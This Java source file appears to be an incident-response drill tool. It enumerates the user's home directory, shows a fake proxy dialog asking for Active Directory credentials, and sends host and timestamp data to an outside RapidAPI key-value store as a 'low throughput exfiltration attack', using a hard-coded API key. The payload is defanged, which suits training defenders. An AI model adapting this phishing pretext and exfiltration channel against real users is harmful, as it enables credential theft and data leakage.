package com.cybersecurity.incidentresponsereadinessexcercises.attacks;

import java.awt.Container;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URI;
import java.net.UnknownHostException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;

import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.plaf.basic.BasicButtonListener;

public class DevUI extends Thread {
	
	private void uploadData(String victimHost, String victimData) throws IOException, InterruptedException {
		HttpRequest request = HttpRequest.newBuilder()
			.uri(URI.create("https://online-key-value-store.p.rapidapi.com/api/KeyVal/UpdateValue/gs48z427/"+victimHost+"/"+victimData))
			.header("X-RapidAPI-Key", "e326bac692msh746fb562610430dp1b0614jsn6b168e2a777e")
			.header("X-RapidAPI-Host", "online-key-value-store.p.rapidapi.com")
			.method("GET", HttpRequest.BodyPublishers.noBody())
			.build();
		HttpResponse<String> response = HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());
		int code = response.statusCode();
		if (code!=200 && code!=201 && code!=405) {
			throw new IOException(response.body());
		}
		System.out.println("Successfull low throughput exfiltration attack to "+request.uri());
	}
	
	protected String getVictimHost() throws UnknownHostException {
		return InetAddress.getLocalHost().getHostName()+"-"+InetAddress.getLocalHost().getHostAddress();
	}
	
	private String getVictimData() {
		return System.currentTimeMillis()+""; // no real data
	}
	
	private void sendVictimData() {
		try {
			System.out.println("Data leakage in real attack would use key: "+getVictimHost());
			uploadData("10.0.1.5" /*getVictimHost()*/, getVictimData());
		}
		catch (Exception e) {
			System.out.println("Proxy call failed: "+e.toString());
		}
	}
	
	public void run() {
		try {
			Files.list(Path.of(System.getProperty("user.home"))).forEach( path -> {
				System.out.println("Found home dir entry "+path.toFile().getName());
			});
		}
		catch (IOException e) {
			e.printStackTrace();
		}
	}
	public final static void main(String[] args) {
		DevUI ui = new DevUI();
		ui.start();
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		catch (Exception e) {}
		JFrame frame = new JFrame("HTTP Connection failed");
		Container panel = frame.getContentPane();
		panel.setLayout(new BoxLayout(panel, BoxLayout.PAGE_AXIS));
		JLabel info = new JLabel("<html><br>Please enter Active Directory credentials to authorize at proxy</html>");
		panel.add(info);
		panel.add(new JLabel("<html><br>user</html>"));
		JTextField inputUser = new JTextField();
		panel.add(Box.createVerticalStrut(30));
		panel.add(inputUser);
		panel.add(new JLabel("<html><br>password</html>"));
		JPasswordField inputPassword = new JPasswordField();
		panel.add(Box.createVerticalStrut(30));
		panel.add(inputPassword);
		panel.add(Box.createVerticalStrut(30));
		JButton update = new JButton("Update");
		update.addMouseListener(new BasicButtonListener(update) {
			@Override
			public void mouseClicked(MouseEvent e) {
				System.exit(0);
			}			
		});
		panel.add(update);
		panel.add(Box.createVerticalStrut(30));
		frame.setSize(800, 600);
		frame.setVisible(true);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		ui.sendVictimData();
	}
}
